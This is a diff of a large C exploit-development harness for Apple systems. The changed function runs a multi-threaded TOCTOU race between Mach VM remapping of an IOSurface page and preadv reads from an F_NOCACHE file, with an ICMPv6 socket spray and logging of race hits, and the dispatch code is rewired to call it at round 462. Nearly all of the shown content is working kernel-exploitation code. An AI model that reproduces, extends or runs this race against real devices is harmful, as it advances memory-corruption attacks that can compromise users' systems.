@@ -17055,31 +17055,31 @@ static void r458_opt_probe(void) {
     /* Phase 2: Remap backing + memory entry */
     rlog("\n  --- Phase 2: Remap backing + memory entry ---\n"); fflush(stdout);
     mach_vm_address_t remap_backing = 0;
-    kern_return_t kr = mach_vm_allocate(mach_task_self(), &remap_backing, R457_BUF_SZ, VM_FLAGS_ANYWHERE);
+    kern_return_t kr = mach_vm_allocate(mach_task_self(), &remap_backing, R458O_BUF_SZ, VM_FLAGS_ANYWHERE);
     if (kr != KERN_SUCCESS) {
         rlog("    FAILED alloc remap: 0x%x\n", kr);
         CFRelease(surf);
-        rlog("\n=== r457 complete ===\n"); return;
+        rlog("\n=== r458_opt complete ===\n"); return;
     }
-    memset((void *)remap_backing, 0xCC, R457_BUF_SZ);
+    memset((void *)remap_backing, 0xCC, R458O_BUF_SZ);
 
-    memory_object_size_t memsz = R457_BUF_SZ;
+    memory_object_size_t memsz = R458O_BUF_SZ;
     mach_port_t mem_entry = MACH_PORT_NULL;
     kr = mach_make_memory_entry_64(mach_task_self(), &memsz, remap_backing,
         VM_PROT_READ | VM_PROT_WRITE, &mem_entry, MACH_PORT_NULL);
     rlog("    mem_entry=0x%x memsz=%llu\n", mem_entry, (unsigned long long)memsz);
     if (kr != KERN_SUCCESS || mem_entry == MACH_PORT_NULL) {
         rlog("    FAILED mem entry\n");
-        mach_vm_deallocate(mach_task_self(), remap_backing, R457_BUF_SZ);
+        mach_vm_deallocate(mach_task_self(), remap_backing, R458O_BUF_SZ);
         CFRelease(surf);
-        rlog("\n=== r457 complete ===\n"); return;
+        rlog("\n=== r458_opt complete ===\n"); return;
     }
 
     /* Also create a restore entry from the IOSurface mapping */
     mach_vm_address_t surf_restore = 0;
-    kr = mach_vm_allocate(mach_task_self(), &surf_restore, R457_BUF_SZ, VM_FLAGS_ANYWHERE);
-    memset((void *)surf_restore, 0x41, R457_BUF_SZ);
-    memory_object_size_t restore_sz = R457_BUF_SZ;
+    kr = mach_vm_allocate(mach_task_self(), &surf_restore, R458O_BUF_SZ, VM_FLAGS_ANYWHERE);
+    memset((void *)surf_restore, 0x41, R458O_BUF_SZ);
+    memory_object_size_t restore_sz = R458O_BUF_SZ;
     mach_port_t restore_entry = MACH_PORT_NULL;
     mach_make_memory_entry_64(mach_task_self(), &restore_sz, surf_restore,
         VM_PROT_READ | VM_PROT_WRITE, &restore_entry, MACH_PORT_NULL);
@@ -17088,20 +17088,20 @@ static void r458_opt_probe(void) {
     /* Phase 3: F_NOCACHE file with 0xAA */
     rlog("\n  --- Phase 3: F_NOCACHE file ---\n"); fflush(stdout);
     char tmppath[256];
-    snprintf(tmppath, sizeof(tmppath), "%s/r457_race", getenv("TMPDIR") ?: "/tmp");
+    snprintf(tmppath, sizeof(tmppath), "%s/r458_race", getenv("TMPDIR") ?: "/tmp");
     int fd = open(tmppath, O_RDWR | O_CREAT | O_TRUNC, 0600);
     fcntl(fd, F_NOCACHE, 1);
-    char *filebuf = (char *)malloc(R457_BUF_SZ);
-    memset(filebuf, 0xAA, R457_BUF_SZ);
-    pwrite(fd, filebuf, R457_BUF_SZ, 0);
+    char *filebuf = (char *)malloc(R458O_BUF_SZ);
+    memset(filebuf, 0xAA, R458O_BUF_SZ);
+    pwrite(fd, filebuf, R458O_BUF_SZ, 0);
     free(filebuf);
     rlog("    File ready: fd=%d\n", fd);
 
     /* Phase 4: ICMPv6 spray */
     rlog("\n  --- Phase 4: ICMPv6 spray ---\n"); fflush(stdout);
-    int icmp_fds[R457_ICMP_SPRAY];
+    int icmp_fds[R458O_ICMP_SPRAY];
     int icmp_count = 0;
-    for (int i = 0; i < R457_ICMP_SPRAY; i++) {
+    for (int i = 0; i < R458O_ICMP_SPRAY; i++) {
         icmp_fds[i] = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
         if (icmp_fds[i] < 0) break;
         struct icmp6_filter filt;
@@ -17114,17 +17114,17 @@ static void r458_opt_probe(void) {
 
     /* Phase 5: Multi-threaded TOCTOU race */
     rlog("\n  --- Phase 5: TOCTOU race (%d remap threads, %d iters) ---\n",
-         R457_REMAP_THREADS, R457_ITERS); fflush(stdout);
+         R458O_REMAP_THREADS, R458O_ITERS); fflush(stdout);
 
-    struct r457_ctx ctxs[R457_REMAP_THREADS];
-    pthread_t remap_tids[R457_REMAP_THREADS];
-    for (int t = 0; t < R457_REMAP_THREADS; t++) {
-        memset(&ctxs[t], 0, sizeof(struct r457_ctx));
+    struct r458_ctx ctxs[R458O_REMAP_THREADS];
+    pthread_t remap_tids[R458O_REMAP_THREADS];
+    for (int t = 0; t < R458O_REMAP_THREADS; t++) {
+        memset(&ctxs[t], 0, sizeof(struct r458_ctx));
         ctxs[t].target = (mach_vm_address_t)(uintptr_t)surf_base;
-        ctxs[t].size = R457_BUF_SZ;
+        ctxs[t].size = R458O_BUF_SZ;
         ctxs[t].mem_entry = mem_entry;
         ctxs[t].thread_id = t;
-        pthread_create(&remap_tids[t], NULL, r457_remap_thread, &ctxs[t]);
+        pthread_create(&remap_tids[t], NULL, r458_remap_thread, &ctxs[t]);
     }
 
     int race_hits = 0, partial_hits = 0;
@@ -17137,39 +17137,39 @@ static void r458_opt_probe(void) {
     (void)dummy;
 
     /* GO — start all remap threads */
-    for (int t = 0; t < R457_REMAP_THREADS; t++) ctxs[t].go = 1;
+    for (int t = 0; t < R458O_REMAP_THREADS; t++) ctxs[t].go = 1;
     __sync_synchronize();
 
-    for (int iter = 0; iter < R457_ITERS; iter++) {
+    for (int iter = 0; iter < R458O_ITERS; iter++) {
         /* Reset: remap IOSurface page back to restore backing (0x41) */
         mach_vm_address_t restore_tgt = (mach_vm_address_t)(uintptr_t)surf_base;
-        mach_vm_map(mach_task_self(), &restore_tgt, R457_BUF_SZ, 0,
+        mach_vm_map(mach_task_self(), &restore_tgt, R458O_BUF_SZ, 0,
             VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
             restore_entry, 0, FALSE,
             VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_NONE);
 
         /* preadv: read file (0xAA) into surf_base — race with remap (0xCC) */
-        struct iovec rv = {surf_base, R457_BUF_SZ};
+        struct iovec rv = {surf_base, R458O_BUF_SZ};
         preadv(fd, &rv, 1, 0);
 
         /* Fast check: sample a few bytes */
         uint8_t *check = (uint8_t *)surf_base;
         int has_cc = 0;
-        for (int j = 0; j < R457_BUF_SZ; j += 256) {
+        for (int j = 0; j < R458O_BUF_SZ; j += 256) {
             if (check[j] == 0xCC) { has_cc = 1; break; }
         }
 
         if (has_cc) {
             /* Full scan */
             int aa = 0, cc = 0, x41 = 0, other = 0;
-            for (int j = 0; j < R457_BUF_SZ; j += 64) {
+            for (int j = 0; j < R458O_BUF_SZ; j += 64) {
                 uint8_t b = check[j];
                 if (b == 0xAA) aa++;
                 else if (b == 0xCC) cc++;
                 else if (b == 0x41) x41++;
                 else other++;
             }
-            int total = R457_BUF_SZ / 64;
+            int total = R458O_BUF_SZ / 64;
             race_hits++;
             if (race_hits <= 10) {
                 rlog("    [iter %d] RACE HIT: aa=%d cc=%d 41=%d other=%d / %d\n",
@@ -17178,15 +17178,15 @@ static void r458_opt_probe(void) {
         }
     }
 
-    for (int t = 0; t < R457_REMAP_THREADS; t++) ctxs[t].stop = 1;
+    for (int t = 0; t < R458O_REMAP_THREADS; t++) ctxs[t].stop = 1;
     __sync_synchronize();
-    for (int t = 0; t < R457_REMAP_THREADS; t++) {
+    for (int t = 0; t < R458O_REMAP_THREADS; t++) {
         pthread_join(remap_tids[t], NULL);
         total_remaps += ctxs[t].remap_count;
     }
 
-    rlog("    Race complete: hits=%d partial=%d / %d iters\n", race_hits, partial_hits, R457_ITERS);
-    rlog("    Total remaps across %d threads: %d\n", R457_REMAP_THREADS, total_remaps);
+    rlog("    Race complete: hits=%d partial=%d / %d iters\n", race_hits, partial_hits, R458O_ITERS);
+    rlog("    Total remaps across %d threads: %d\n", R458O_REMAP_THREADS, total_remaps);
 
     /* Phase 6: ICMPv6 filter check */
     rlog("\n  --- Phase 6: ICMPv6 filter check ---\n"); fflush(stdout);
@@ -17204,18 +17204,18 @@ static void r458_opt_probe(void) {
     close(fd); unlink(tmppath);
     mach_port_deallocate(mach_task_self(), mem_entry);
     mach_port_deallocate(mach_task_self(), restore_entry);
-    mach_vm_deallocate(mach_task_self(), remap_backing, R457_BUF_SZ);
-    mach_vm_deallocate(mach_task_self(), surf_restore, R457_BUF_SZ);
+    mach_vm_deallocate(mach_task_self(), remap_backing, R458O_BUF_SZ);
+    mach_vm_deallocate(mach_task_self(), surf_restore, R458O_BUF_SZ);
     CFRelease(surf);
 
-    rlog("\n=== r457 complete ===\n");
+    rlog("\n=== r458_opt complete ===\n");
 
-    #undef R457_PAGE_SZ
-    #undef R457_PAGES
-    #undef R457_BUF_SZ
-    #undef R457_ITERS
-    #undef R457_REMAP_THREADS
-    #undef R457_ICMP_SPRAY
+    #undef R458O_PAGE_SZ
+    #undef R458O_PAGES
+    #undef R458O_BUF_SZ
+    #undef R458O_ITERS
+    #undef R458O_REMAP_THREADS
+    #undef R458O_ICMP_SPRAY
 }
 
 /* r455: Multi-threaded DarkSword TOCTOU race */
@@ -83373,10 +83373,10 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
-        if (rounds == 461) {
-            rlog("*** rounds=461: Optimized TOCTOU race ***\n\n");
+        if (rounds == 462) {
+            rlog("*** rounds=462: Optimized TOCTOU race ***\n\n");
             fflush(stdout);
-            r457_probe();
+            r458_opt_probe();
             goto done;
         }
         if (rounds == 461) {
@@ -86171,7 +86171,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 461 && rounds != 460 && rounds != 452 && rounds != 453) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 462 && rounds != 461 && rounds != 460 && rounds != 452 && rounds != 453) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
